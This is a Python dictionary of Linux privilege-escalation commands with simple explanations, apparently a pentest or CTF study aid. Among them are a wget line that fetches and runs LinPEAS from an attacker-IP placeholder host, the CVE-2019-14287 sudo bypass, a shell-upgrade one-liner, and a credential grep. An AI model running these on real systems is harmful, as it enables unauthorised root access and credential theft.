"""Pre-authored ELI5 explanations for Linux privilege-escalation
enumeration commands — what to check once you have a foothold shell."""
from __future__ import annotations

ENTRIES: dict[str, str] = {
    "sudo -l": (
        "Lists what commands the current user is allowed to run with "
        "sudo (as another user, usually root), and whether a password "
        "is required. This is one of the very first things to check on "
        "any Linux foothold — if you're allowed to run something like "
        "vim, find, or python with sudo, that often leads directly to a "
        "root shell (check gtfobins.github.io for the specific binary "
        "found)."
    ),
    "find / -perm -4000 -type f 2>/dev/null": (
        "Searches the whole filesystem for SUID binaries — programs "
        "that run with the file owner's permissions (often root) "
        "regardless of who executes them. -perm -4000 matches the SUID "
        "permission bit specifically. 2>/dev/null hides 'permission "
        "denied' error spam from folders you can't read. Any unusual "
        "SUID binary here is worth checking against GTFOBins for a "
        "known privesc technique."
    ),
    "find / -perm -2000 -type f 2>/dev/null": (
        "Same idea as the SUID search, but -perm -2000 looks for SGID "
        "binaries instead — programs that run with the file's group "
        "permissions rather than the owner's. Less commonly exploitable "
        "than SUID, but still worth checking, especially if the group "
        "in question has interesting access."
    ),
    "find / -writable -type d 2>/dev/null": (
        "Lists every directory on the filesystem that the current user "
        "can write to. Useful for spotting misconfigured folders — a "
        "world-writable directory in an unexpected place (like inside "
        "/etc or a cron script's working directory) can sometimes be "
        "abused to plant a malicious file that a privileged process "
        "later executes."
    ),
    "cat /etc/crontab": (
        "Shows the system-wide scheduled tasks (cron jobs) that run "
        "automatically, often as root. Worth checking whether any "
        "listed script is writable by your current user — if so, "
        "editing it means your code runs with whatever privilege level "
        "the cron job has, which can be an easy path to root."
    ),
    "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/": (
        "Lists additional locations where scheduled cron jobs can be "
        "defined beyond the main crontab file. Same idea as checking "
        "/etc/crontab — look for scripts here that your current user "
        "can modify, since anything run by these directories often runs "
        "as root."
    ),
    "getcap -r / 2>/dev/null": (
        "Linux capabilities are a more fine-grained alternative to full "
        "root privilege — a binary can be granted just one specific "
        "root-like power (e.g. the ability to bind to low-numbered "
        "network ports, or read any file) without full SUID root. This "
        "command searches the filesystem for any binary with capabilities "
        "set, since certain capabilities (like cap_setuid) are directly "
        "exploitable for privesc, same as GTFOBins-documented SUID "
        "binaries."
    ),
    "id": (
        "Shows your current user's identity: username, user ID (UID), "
        "and every group you belong to. Always worth running right "
        "after landing a foothold — knowing your current privilege "
        "level and group memberships (some groups grant surprising "
        "access, like 'docker' or 'disk') shapes what privesc paths "
        "are even worth checking."
    ),
    "uname -a": (
        "Prints the kernel version and system architecture. Worth "
        "checking against known kernel exploits (searchsploit is a good "
        "first stop) — an outdated kernel sometimes has a public, "
        "working local-privilege-escalation exploit, though kernel "
        "exploits can be riskier/less stable than a cleaner "
        "misconfiguration-based path."
    ),
    "cat /etc/passwd": (
        "Lists every user account on the system, along with their "
        "shell and home directory. Doesn't contain passwords (those "
        "live in the separate, usually-protected /etc/shadow file), but "
        "shows you who exists on the box — useful for identifying other "
        "usernames worth investigating or targeting."
    ),
    "sudo -u#-1 <command>": (
        "This is a specific exploit technique for CVE-2019-14287, a "
        "sudo bug: on vulnerable sudo versions, specifying user ID -1 "
        "(written as #-1) when you're allowed to run a command 'as any "
        "user except root' tricks sudo into running it as root anyway, "
        "because -1 gets interpreted as UID 0 due to an integer "
        "handling quirk. Only relevant if 'sudo -l' shows a rule with "
        "'(ALL, !root)' and the sudo version is vulnerable."
    ),
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'": (
        "This isn't a privesc command exactly, but you'll see it "
        "constantly on the way to one: it upgrades a bare/limited shell "
        "(the kind you often land after exploiting a service) into a "
        "fuller interactive bash shell with tab-completion, arrow-key "
        "history, and the ability to run interactive programs like sudo "
        "or vim properly. pty.spawn creates a real pseudo-terminal "
        "instead of the raw pipe you started with."
    ),
    "wget http://<attacker-ip>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh": (
        "Downloads and runs LinPEAS, a well-known automated Linux "
        "privilege-escalation enumeration script, onto the target. It "
        "checks dozens of common misconfigurations automatically (SUID "
        "binaries, writable cron jobs, capabilities, kernel version, "
        "credentials left in files, etc.) and highlights the most "
        "promising findings in color. Very thorough, but genuinely worth "
        "reading manually too — automated tools can miss context a "
        "human would catch, and the output can be long."
    ),
    "find / -name '*.bak' -o -name '*.old' -o -name '*~' 2>/dev/null": (
        "Searches for backup files developers or sysadmins commonly "
        "leave behind — files ending in .bak, .old, or ~ (a common "
        "editor backup suffix). These sometimes contain old source code, "
        "credentials, or configuration that was never meant to stay on "
        "the box, and are an easy thing to overlook manually."
    ),
    "grep -r 'password' /etc /var/www /opt 2>/dev/null": (
        "Searches common directories for the literal word 'password' "
        "in any file — a blunt but genuinely effective way to catch "
        "hardcoded credentials left in config files, scripts, or "
        "leftover notes. Worth trying variations (case-insensitive with "
        "-i, other keywords like 'passwd' or 'secret') since developers "
        "aren't consistent about naming."
    ),
}
